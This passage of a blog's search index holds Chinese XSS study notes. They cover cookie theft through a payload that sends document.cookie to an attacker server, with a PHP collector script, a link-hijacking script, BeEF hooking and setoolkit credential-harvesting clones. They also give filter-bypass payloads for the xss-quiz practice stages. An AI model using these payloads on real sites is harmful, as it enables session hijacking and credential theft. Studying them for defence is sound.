<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hexo-apply</title>
      <link href="/2019/08/12/hexo-apply/"/>
      <url>/2019/08/12/hexo-apply/</url>
      
        <content type="html"><![CDATA[<img src="/2019/08/12/hexo-apply/example.jpg" title="This is an example image">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>无线安全之WiFi技术</title>
      <link href="/2019/08/08/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E4%B9%8BWiFi%E6%8A%80%E6%9C%AF/"/>
      <url>/2019/08/08/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E4%B9%8BWiFi%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 无线安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习笔记</title>
      <link href="/2019/08/04/xss%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/08/04/xss%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>xss学习记录</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>跨站脚本攻击（Cross Site Scripting）为了不和层叠样式表（CSS）混淆，故缩写为XSS；攻击者在web页面内插入恶意java script 代码，当用户浏览该页面时，恶意代码（js）会被执行，即达到攻击目的。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>又称非持久性XSS，具有一次性。<br>攻击者通过邮件等形式将包含xss代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有xss的代码发送给用户，用户浏览器解析执行代码，触发xss漏洞。</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>又称持久型XSS，攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性。<br>攻击者在论坛上，博客，留言板中，发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库中。当用户进行正常访问时，触发XSS代码。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM型XSS全称Document Object Model，使用DOM动态访问更新文档的内容，结构及样式。<br>服务器响应不会处理攻击者脚本，而是用户浏览器处理这个响应时，DOM对象就会 处理XSS代码，触发XSS漏洞。</p><h2 id="盗取cookie"><a href="#盗取cookie" class="headerlink" title="盗取cookie"></a>盗取cookie</h2><h3 id="cookie介绍"><a href="#cookie介绍" class="headerlink" title="cookie介绍"></a>cookie介绍</h3><p>某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）</p><p>在http协议下，服务器或脚本可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户浏览器（客户端）上的小文本文件，它可包含有关用户的信息</p><p>目前cookie有临时的也有持续的，临时的只在浏览器上保存一段时间，超过规定时间，该cookie会被系统清除。</p><p>服务器可以利用cookie包含信息的任意性来筛选或经常性维护这些信息，以判断在http传输中的状态。</p><p>典型应用为判断注册用户是否已经登录网站；提示用户是否保存账号，保留用户信息，简化下次登录；购物车结账（在不同页面下选择的同一家的商品）信息都会写入到cookies。</p><h3 id="反射xss盗取cookie"><a href="#反射xss盗取cookie" class="headerlink" title="反射xss盗取cookie"></a>反射xss盗取cookie</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?uname=&lt;script&gt;document.location='http://ip/xss_test/cookie.php?cookie='+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>将连接发送到用户，用户点击即触发XSS漏洞，同时可以使用URL编码迷惑用户。</p><p><code>cookie.php</code>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie=$_GET[<span class="string">'cookie'</span>];</span><br><span class="line">file_put_contents(<span class="string">'cookie.txt'</span>,$cookie);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>cookie 接受cookie参数，写入到cookie.txt</p></blockquote><h3 id="利用cookie会话劫持"><a href="#利用cookie会话劫持" class="headerlink" title="利用cookie会话劫持"></a>利用cookie会话劫持</h3><p>burp登录界面修改cookie，成功登录</p><h3 id="劫持会话后的操作"><a href="#劫持会话后的操作" class="headerlink" title="劫持会话后的操作"></a>劫持会话后的操作</h3><p> 1.修改配置文件<br> 2.上传webshell</p><h2 id="篡改网页链接"><a href="#篡改网页链接" class="headerlink" title="篡改网页链接"></a>篡改网页链接</h2><h3 id="js代码讲解"><a href="#js代码讲解" class="headerlink" title="js代码讲解"></a>js代码讲解</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> link=<span class="built_in">document</span>.getElementsByTagName(<span class="string">"a"</span>);</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;link.length;j++)&#123;</span><br><span class="line">    link[j].href=<span class="string">"http://attacker-site.com/"</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>window.onload 当窗口加载时，执行匿名函数。<br>使用for循环遍历所有获得的连接a标签</p></blockquote><h3 id="xss篡改链接"><a href="#xss篡改链接" class="headerlink" title="xss篡改链接"></a>xss篡改链接</h3><p>在xss位置输入上面代码</p><h3 id="篡改链接指向流量url"><a href="#篡改链接指向流量url" class="headerlink" title="篡改链接指向流量url"></a>篡改链接指向流量url</h3><p>刷流量，上述代码修改url</p><h3 id="篡改链接指向恶意url"><a href="#篡改链接指向恶意url" class="headerlink" title="篡改链接指向恶意url"></a>篡改链接指向恶意url</h3><p>beef 进行恶意链接生成，以及利用hook.js执行其他命令。<br>kali中终端输入<code>beef-xss</code>启动beef并生成恶意链接,</p><p>开启一个服务器( <code>service apache2 start</code>  )，将下面代码写入到代码（/var/www/index.html）当中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"http://ip[:port]/hook.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>最后修改url至攻击者的服务器页面，点击即触发。</p><h2 id="盗取用户信息"><a href="#盗取用户信息" class="headerlink" title="盗取用户信息"></a>盗取用户信息</h2><h3 id="盗取用户信息原理"><a href="#盗取用户信息原理" class="headerlink" title="盗取用户信息原理"></a>盗取用户信息原理</h3><p>克隆网站登录界面，利用存储xss设置跳转代码，如果用户访问即跳转到克隆的登录页面，用户输入登录，账号密码被存储。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">A[用户] --&gt; |访问| B[原始站点有存xss漏洞]</span><br><span class="line">B --&gt; |跳转| C[克隆站点]</span><br><span class="line">A --&gt; |输入账号密码|C</span><br><span class="line">C--&gt;|用户输入账号密码|D(成功获取并存储)</span><br></pre></td></tr></table></figure><h3 id="setoolkit工具克隆网站"><a href="#setoolkit工具克隆网站" class="headerlink" title="setoolkit工具克隆网站"></a>setoolkit工具克隆网站</h3><p>万能的社工工具<br>Select from the menu: <code>从菜单中选择:</code></p><p>   1) Social-Engineering Attacks <code>社会工程学攻击</code><br>   2) Penetration Testing (Fast-Track) <code>穿透测试(快速通道)</code><br>   3) Third Party Modules <code>第三方模块</code><br>   4) Update the Social-Engineer Toolkit <code>更新社交工程师工具包</code><br>   5) Update SET configuration <code>更新集合配置</code><br>   6) Help, Credits, and About <code>帮助，学分，等等</code></p><blockquote><p> 选中1<br>    1) Spear-Phishing Attack Vectors <code>鱼叉式钓鱼攻击载体</code><br>    2) Website Attack Vectors <code>网站攻击载体</code><br>    3) Infectious Media Generator <code>感染介质发生器</code><br>    4) Create a Payload and Listener <code>创建一个有效负载和侦听器</code><br>    5) Mass Mailer Attack <code>大规模邮件攻击</code><br>    6) Arduino-Based Attack Vector <code>基于arduino的攻击向量</code><br>    7) Wireless Access Point Attack Vector <code>无线接入点攻击向量</code><br>    8) QRCode Generator Attack Vector <code>QRCode生成器攻击向量</code><br>    9) Powershell Attack Vectors <code>Powershell攻击向量</code><br>    10) Third Party Modules <code>第三方模块</code><br> 选中2<br>    1) Java Applet Attack Method <code>Java Applet攻击方法</code><br>    2) Metasploit Browser Exploit Method <code>Metasploit浏览器利用方法</code><br>    3) Credential Harvester Attack Method <code>凭证收割机攻击方法</code><br>    4) Tabnabbing Attack Method <code>制表攻击法</code><br>    5) Web Jacking Attack Method <code>顶网攻击方法</code><br>    6) Multi-Attack Web Method <code>多攻击Web方法</code><br>    7) HTA Attack Method <code>HTA攻击方法</code><br> 选中3<br>    1) Web Templates <code>网页模板</code><br>    2) Site Cloner <code>现场切割</code><br>    3) Custom Import <code>自定义导入</code><br> 选中2</p></blockquote><p>Enter the IP address for POST back in Harvester/Tabnabbing: (默认会使用网卡上的地址)<br>Enter the url to clone:<code>输入要克隆的站点url</code></p><h3 id="存储xss跳转克隆网站"><a href="#存储xss跳转克隆网站" class="headerlink" title="存储xss跳转克隆网站"></a>存储xss跳转克隆网站</h3><p>xss payload: </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.location=<span class="string">"http://ip/"</span>&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="查看盗取账号和密码"><a href="#查看盗取账号和密码" class="headerlink" title="查看盗取账号和密码"></a>查看盗取账号和密码</h3><p>在setoolkit终端中查看账号密码</p><h2 id="没有过滤的xss"><a href="#没有过滤的xss" class="headerlink" title="没有过滤的xss"></a>没有过滤的xss</h2><h3 id="实验环境介绍"><a href="#实验环境介绍" class="headerlink" title="实验环境介绍"></a>实验环境介绍</h3><p>一个日本安全研究员制作的xss练习靶场<br><a href="https://xss-quiz.int21h.jp/" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/</a><br>在IE浏览器中打开</p><h3 id="闭合文本标签利用xss"><a href="#闭合文本标签利用xss" class="headerlink" title="闭合文本标签利用xss"></a>闭合文本标签利用xss</h3><p>打开审查工具，查看代码</p><blockquote><p>stage #1 </p><p><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a></p></blockquote><p>简单payload：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>闭合payload:  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="属性中的xss"><a href="#属性中的xss" class="headerlink" title="属性中的xss"></a>属性中的xss</h2><h3 id="配置chrome关闭xss-auditor"><a href="#配置chrome关闭xss-auditor" class="headerlink" title="配置chrome关闭xss-auditor"></a>配置chrome关闭xss-auditor</h3><p>右键Chrome快捷方式，选择属性，复制文件位置，创建快捷方式，粘贴，并在后面加上<code>--args --disable-xss-auditor</code> ,最后给快捷方式命名，完成。</p><p>之后就不用IE了，改用Chrome。 </p><h3 id="属性中xss发现"><a href="#属性中xss发现" class="headerlink" title="属性中xss发现"></a>属性中xss发现</h3><p>Ctrl+f<br>代码审查</p><blockquote><p>stage #2 </p><p> <a href="http://xss-quiz.int21h.jp/stage2.php?sid=106cdb0a46450efb744850a579323ac9103d907c" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage2.php?sid=106cdb0a46450efb744850a579323ac9103d907c</a></p></blockquote><p>属性中xss闭合引入script</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>属性中xss闭合引入事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" onmouseover=alert(document.domain);&gt;</span></span><br></pre></td></tr></table></figure><h2 id="选择列表中的xss"><a href="#选择列表中的xss" class="headerlink" title="选择列表中的xss"></a>选择列表中的xss</h2><h3 id="html-select-标签介绍"><a href="#html-select-标签介绍" class="headerlink" title="html select 标签介绍"></a>html select 标签介绍</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select&gt;</span><br><span class="line">&lt;option&gt;name&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>select&gt;</span><br></pre></td></tr></table></figure><h3 id="表单介绍"><a href="#表单介绍" class="headerlink" title="表单介绍"></a>表单介绍</h3><p>html表单用于搜集不同类型的用户输入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"?sid=..."</span> method=<span class="string">"post"</span>&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>burp测试</p><blockquote><p>stage #3 </p><p><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=d830eb35fde6abc802cb930e5ba1b2adaaf6680d" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-3.php?sid=d830eb35fde6abc802cb930e5ba1b2adaaf6680d</a></p></blockquote><p>抓取，p2储存在漏洞<br>payload: </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2=japan&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="选择参数中的xss"><a href="#选择参数中的xss" class="headerlink" title="选择参数中的xss"></a>选择参数中的xss</h2><h3 id="html表单隐藏参数介绍"><a href="#html表单隐藏参数介绍" class="headerlink" title="html表单隐藏参数介绍"></a>html表单隐藏参数介绍</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"..."</span> value=<span class="string">"..."</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="html中svg介绍"><a href="#html中svg介绍" class="headerlink" title="html中svg介绍"></a>html中svg介绍</h3><p>svg：<br>意为可缩放的矢量图形，使用xml格式定义图像<br>可通过以下标签嵌入html文档：<code>&lt;wmbed&gt;</code>,<code>&lt;object&gt;</code>或者<code>&lt;iframe&gt;</code>，也可以使用<code>&lt;svg&gt;</code>标签嵌入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/事件=<span class="string">""</span>&gt;</span><br><span class="line">&lt;svg/onload=alert(<span class="built_in">document</span>.domain)&gt;%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><h3 id="闭合触发xss"><a href="#闭合触发xss" class="headerlink" title="闭合触发xss"></a>闭合触发xss</h3><blockquote><p>stage #4 </p><p><a href="http://xss-quiz.int21h.jp/stage_4.php?sid=9fb2ab3ae196c1fb05d9157d3d5f6c91b2b4398c" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_4.php?sid=9fb2ab3ae196c1fb05d9157d3d5f6c91b2b4398c</a></p></blockquote><p>payload: </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="限制输入长度的xss"><a href="#限制输入长度的xss" class="headerlink" title="限制输入长度的xss"></a>限制输入长度的xss</h2><h3 id="html-表单文本框介绍"><a href="#html-表单文本框介绍" class="headerlink" title="html 表单文本框介绍"></a>html 表单文本框介绍</h3><p>html表单用于搜集不同类型的用户输入；表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等等；这里介绍text定义常规文本输入。</p><p>属性介绍：</p><p>value 规定输入字段的初始值</p><p>readonly 规定输入字段为只读</p><p>disabled 规定输入字段是禁用的。被禁用的元素不可用，不可点击，不会提交。</p><p>size 规定输入字段的字符</p><p>maxlength 规定输入字段允许的最大长度</p><h3 id="xss-payload长度计算"><a href="#xss-payload长度计算" class="headerlink" title="xss payload长度计算"></a>xss payload长度计算</h3><p>利用python len函数,如下，结果为40字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = <span class="string">"&lt;script&gt;alert(document.domain);&lt;/script&gt;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(payload)</span><br></pre></td></tr></table></figure><h3 id="浏览器审查工具修改源码"><a href="#浏览器审查工具修改源码" class="headerlink" title="浏览器审查工具修改源码"></a>浏览器审查工具修改源码</h3><blockquote><p>stage #5 </p><p><a href="http://xss-quiz.int21h.jp/stage--5.php?sid=2d4972900f3da3e4e8dd3bb442c5e59402ede268" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage--5.php?sid=2d4972900f3da3e4e8dd3bb442c5e59402ede268</a></p></blockquote><p>paylaod: 先修改maxlength</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="payload-触发xss漏洞"><a href="#payload-触发xss漏洞" class="headerlink" title="payload 触发xss漏洞"></a>payload 触发xss漏洞</h3><p>随着安全意识的提高，script可能会被过滤</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg/onload=alert(document.domaim)&gt;%0a</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">111</span><span class="string">" onmouseover="</span>alert(<span class="built_in">document</span>.domain)<span class="string">"</span></span><br></pre></td></tr></table></figure><h2 id="html事件中的xss"><a href="#html事件中的xss" class="headerlink" title="html事件中的xss"></a>html事件中的xss</h2><h3 id="html事件介绍"><a href="#html事件介绍" class="headerlink" title="html事件介绍"></a>html事件介绍</h3><p>在现代浏览器中内置有大量的事件处理器，监事特定的条件或用户行为，例如鼠标点击（onclick）或浏览器窗口完成加载某个图像（onload）。通过使用客户端的js,可以将某些特定的事件处理器作为属性添加给特定的标签，并可以在事件发生时执行一个或多个javascript命令或函数</p><h3 id="xss漏洞发现"><a href="#xss漏洞发现" class="headerlink" title="xss漏洞发现"></a>xss漏洞发现</h3><blockquote><p>stage #6 </p><p><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=60b74c922558e644330a8769788ef25dae80d8e0" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-no6.php?sid=60b74c922558e644330a8769788ef25dae80d8e0</a></p></blockquote><p> 审查代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>+"<span class="attr">132456</span>"&gt;</span></span><br></pre></td></tr></table></figure><h3 id="闭合思路分析"><a href="#闭合思路分析" class="headerlink" title="闭合思路分析"></a>闭合思路分析</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"onmouseover="</span>alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg/onload=alert(document.domain)&gt;%0a</span></span><br></pre></td></tr></table></figure><h3 id="payload触发xss漏洞"><a href="#payload触发xss漏洞" class="headerlink" title="payload触发xss漏洞"></a>payload触发xss漏洞</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" onclick="</span>alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><h2 id="空格分隔属性的xss"><a href="#空格分隔属性的xss" class="headerlink" title="空格分隔属性的xss"></a>空格分隔属性的xss</h2><h3 id="xss探测"><a href="#xss探测" class="headerlink" title="xss探测"></a>xss探测</h3><blockquote><p>stage #7 </p><p><a href="http://xss-quiz.int21h.jp/stage07.php?sid=c702ac5f967df2831c3920c1aa3100af0b3e5aa8" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage07.php?sid=c702ac5f967df2831c3920c1aa3100af0b3e5aa8</a></p></blockquote><h3 id="触发xss"><a href="#触发xss" class="headerlink" title="触发xss"></a>触发xss</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span> onmouseover=alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><h2 id="javascript伪协议的xss"><a href="#javascript伪协议的xss" class="headerlink" title="javascript伪协议的xss"></a>javascript伪协议的xss</h2><h3 id="javascript伪协议介绍"><a href="#javascript伪协议介绍" class="headerlink" title="javascript伪协议介绍"></a>javascript伪协议介绍</h3><p>将js 代码添加到客户端，方法是把它放置在伪协议说明符<code>javascript:</code>后的url中。</p><p>他声明了url的主题是任意javascript，它由javascript的解释器运行，若果javascript:url中的js代码含有多个语句，必须要用<code>;</code>讲这些语句分隔开</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:<span class="keyword">var</span> now = now Data();<span class="string">"&lt;h1&gt;this item&lt;/h1&gt;"</span> + now;</span><br></pre></td></tr></table></figure><p>js 还可以只含有动作，但不返回值得js语句</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="string">"hello world"</span>)</span><br></pre></td></tr></table></figure><p>xss漏洞发现并触发</p><p>设置第一无二字符串提交，在响应中寻找。</p><blockquote><p>stage #8 </p><p><a href="http://xss-quiz.int21h.jp/stage008.php?sid=b23793aaeaad16b5faa949a246a1316e9cf24917" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage008.php?sid=b23793aaeaad16b5faa949a246a1316e9cf24917</a></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(document.domain)"</span>&gt;</span>javascript:alert(document.domain)<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="utf-7-xss"><a href="#utf-7-xss" class="headerlink" title="utf-7 xss"></a>utf-7 xss</h2><blockquote><p>stage #9 </p><p><a href="http://xss-quiz.int21h.jp/stage_09.php?sid=7e3613202c0e7cc4ed129d4c60b98dbe887aa456" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_09.php?sid=7e3613202c0e7cc4ed129d4c60b98dbe887aa456</a></p></blockquote><p>这里的utf-7 现在的浏览器已经移除了这种编码，危害较小</p><p>所以这里取巧：</p><p><img src="/images/xss_stage9.png" alt></p><p><img src="..%5Cimages%5Cxss_stage9_1.png" alt></p><p><img src="..%5Cimages%5Cxss_stage9_2.png" alt></p><p>或者 点击跳过这关</p><p><img src="%5Cimages%5Cxss_stage.png" alt></p><h2 id="绕过过滤domain为空的xss"><a href="#绕过过滤domain为空的xss" class="headerlink" title="绕过过滤domain为空的xss"></a>绕过过滤domain为空的xss</h2><blockquote><p>stage #10 </p><p><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=b86e436416bd0ed72ba8e07ffd237471e7bd006d" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage00010.php?sid=b86e436416bd0ed72ba8e07ffd237471e7bd006d</a></p></blockquote><p><img src="%5Cimages%5Cxss_stage10.png" alt></p><p><img src="%5Cimages%5Cxss_stage10_1.png" alt></p><p><img src="%5Cimages%5Cxss_stage10_2.png" alt></p><p><img src="%5Cimages%5Cxss_stage10_3.png" alt></p><p>domain被过滤，采取双写，编码绕过</p><p>双写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">132456</span><span class="string">"&gt;&lt;svg/onload=alert(document.domdomainain)&gt;%0a</span></span><br></pre></td></tr></table></figure><p>这里使用base64编绕过，也可以采用其他</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">132456</span><span class="string">"&gt;&lt;script&gt;eval(atob("</span>YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==<span class="string">"));&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="绕过替换script和on事件的xss"><a href="#绕过替换script和on事件的xss" class="headerlink" title="绕过替换script和on事件的xss"></a>绕过替换script和on事件的xss</h2><blockquote><p>stage #11</p><p><a href="https://xss-quiz.int21h.jp/stage11th.php?sid=53f688b9e3f5640b32d4096f5b0b5e4f193e5b4a" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage11th.php?sid=53f688b9e3f5640b32d4096f5b0b5e4f193e5b4a</a></p></blockquote><p>在伪协议中带空格仍然能执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">132456</span><span class="string">"&gt;&lt;a href="</span>javasc ript:alert(<span class="built_in">document</span>.domain);<span class="string">"&gt;xss&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><img src="%5Cimages%5Cxss_stage11.png" alt></p><p>然而，404,空格换一下在script中间插入<code>&amp;#09;</code>，<code>&amp;#10;</code>，空格等不可见字符，让正则匹配不到。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123"&gt;&lt;a href="javasc&amp;#10;ript:alert(document.domain);"&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="IE特性绕过xss过滤"><a href="#IE特性绕过xss过滤" class="headerlink" title="IE特性绕过xss过滤"></a>IE特性绕过xss过滤</h2><blockquote><p>stage #12</p><p><a href="https://xss-quiz.int21h.jp/stage_no012.php?sid=6bd3fefa2774a7d333026335d5f24239d7ebb75b" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage_no012.php?sid=6bd3fefa2774a7d333026335d5f24239d7ebb75b</a></p></blockquote><p>这里过滤了&lt;,”,ie,有一特性  两个  `  号 可闭合 “</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">``</span> onmouseover=alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><h2 id="css-特性绕过xss过滤"><a href="#css-特性绕过xss过滤" class="headerlink" title="css 特性绕过xss过滤"></a>css 特性绕过xss过滤</h2><blockquote><p>stage #13</p><p><a href="https://xss-quiz.int21h.jp/stage13_0.php?sid=6c076a83715f2f3d68d7fa96051c8cba0d5528b2" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage13_0.php?sid=6c076a83715f2f3d68d7fa96051c8cba0d5528b2</a></p></blockquote><p>同样是在ie中，css特性： <code>;background:url(&quot;javascript:alert(document.dmain);&quot;)</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-color:salmon;background:url(<span class="string">"javascript:alert(document.domain);"</span>)</span><br></pre></td></tr></table></figure><h2 id="css触发xss"><a href="#css触发xss" class="headerlink" title="css触发xss"></a>css触发xss</h2><h3 id="css介绍"><a href="#css介绍" class="headerlink" title="css介绍"></a>css介绍</h3><p>层叠样式表是一种用来表现html或xml等文件样式的计算机语言。css不仅可以静态的修饰网页，还可以配合各种脚本语言动态的对网页各元素进行格式化。</p><h3 id="css中执行js"><a href="#css中执行js" class="headerlink" title="css中执行js"></a>css中执行js</h3><p>css expression(css 表达式)又称Dymamic properties(动态属性)是早期微软DHTML的产物，以其可以在css中定义表达式（公式）来达到建立元素间属性之间的联系等作用，从IE5开始得到支持，后因标准、性能、安全性等问题、微软IE8 bate2标准模式开始，取消对css expression的支持。（实际应用：导航栏，返回顶部）</p><h3 id="注释绕过关键字过滤"><a href="#注释绕过关键字过滤" 